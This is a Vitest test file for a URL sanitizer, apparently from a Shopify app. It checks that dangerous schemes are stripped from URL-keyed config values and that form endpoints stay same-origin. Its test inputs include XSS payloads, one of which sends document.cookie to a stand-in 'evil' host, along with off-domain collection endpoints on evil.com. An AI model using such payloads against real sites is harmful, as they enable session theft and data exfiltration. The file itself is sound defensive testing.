import { describe, it, expect } from 'vitest';
import { sanitizeUrlValue, sanitizeConfigUrls } from '~/services/recipes/compiler/sanitize-urls';

describe('sanitizeUrlValue — dangerous scheme stripping', () => {
  it('blanks javascript:/data:/vbscript: (incl. obfuscated)', () => {
    for (const bad of [
      'javascript:alert(1)',
      '  JavaScript:alert(1)',
      'java\tscript:alert(1)',
      'javascript&colon;alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
      'JAVASCRIPT:fetch("//evil/"+document.cookie)',
    ]) {
      expect(sanitizeUrlValue(bad), bad).toBe('');
    }
  });

  it('preserves safe URLs (http/https/mailto/tel/relative/anchor)', () => {
    for (const ok of [
      'https://example.com/x?y=1',
      'http://shop.myshopify.com',
      'mailto:hi@example.com',
      'tel:+15551234',
      '/collections/all',
      '#section',
      '//cdn.example.com/a.png',
      'products/handle',
    ]) {
      expect(sanitizeUrlValue(ok), ok).toBe(ok);
    }
  });
});

describe('sanitizeConfigUrls — recursive, url-keyed, non-mutating', () => {
  it('strips dangerous schemes only in url-ish keys, deep + in arrays', () => {
    const input = {
      title: 'javascript:not-a-url-key-keep-me',
      ctaUrl: 'javascript:alert(1)',
      linkUrl: 'https://ok.com',
      imageUrl: 'data:image/svg+xml,<svg/onload=alert(1)>',
      proxyEndpointPath: 'javascript:steal()',
      blocks: [
        { kind: 'cta', text: 'Buy', url: 'javascript:alert(2)', fields: { ctaUrl: 'https://safe.com' } },
        { kind: 'media', imageUrl: 'https://cdn/x.png' },
      ],
    };
    const out = sanitizeConfigUrls(input);
    const b0 = out.blocks[0]!;
    const b1 = out.blocks[1]!;
    expect(out.ctaUrl).toBe('');
    expect(out.linkUrl).toBe('https://ok.com');
    expect(out.imageUrl).toBe('');
    expect(out.proxyEndpointPath).toBe('');
    expect(b0.url).toBe('');
    expect((b0.fields as { ctaUrl: string }).ctaUrl).toBe('https://safe.com');
    expect((b1 as { imageUrl: string }).imageUrl).toBe('https://cdn/x.png');
    // non-url key with a scheme-like string is left alone (it's content, not a link)
    expect(out.title).toBe('javascript:not-a-url-key-keep-me');
    // input not mutated
    expect(input.ctaUrl).toBe('javascript:alert(1)');
  });

  it('forces endpoint/action/path keys to same-origin (PII-exfil guard)', () => {
    const out = sanitizeConfigUrls({
      submissionMode: 'APP_PROXY',
      proxyEndpointPath: 'https://evil.com/collect',
      action: '//evil.com/x',
      okPath: '/apps/superapp/capture',
      anchorAction: '#form',
    });
    expect(out.proxyEndpointPath).toBe(''); // absolute off-domain → blanked
    expect(out.action).toBe(''); // protocol-relative → blanked
    expect(out.okPath).toBe('/apps/superapp/capture'); // same-origin kept
    expect(out.anchorAction).toBe('#form');
  });

  it('leaves bare-token endpoint-keyed values alone (matchAction=SHOW must survive)', () => {
    const out = sanitizeConfigUrls({
      ruleEngine: { matchAction: 'HIDE', groups: [{ conditions: [{ attribute: 'loggedIn', value: 'SHOW' }] }] },
    }) as { ruleEngine: { matchAction: string } };
    expect(out.ruleEngine.matchAction).toBe('HIDE'); // not a URL → untouched
  });

  it('passes through primitives/null/undefined safely', () => {
    expect(sanitizeConfigUrls(undefined)).toBeUndefined();
    expect(sanitizeConfigUrls(null)).toBeNull();
    expect(sanitizeConfigUrls({ n: 1, b: true, u: null })).toEqual({ n: 1, b: true, u: null });
  });
});
